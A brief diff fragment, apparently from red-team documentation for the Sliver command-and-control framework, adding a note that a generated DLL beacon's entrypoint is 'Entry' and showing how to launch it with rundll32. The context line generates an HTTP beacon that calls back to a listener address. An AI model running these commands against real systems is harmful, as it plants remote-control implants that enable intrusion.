@@ -187,3 +187,8 @@ sliver > generate beacon --http http://192.168.161.50 -E -f shared
 sliver >
 ```
 
+Dll entrypoint is **Entry**.
+
+```
+> rundll32.exe LEGAL_LENGTH.dll,Entry
+```
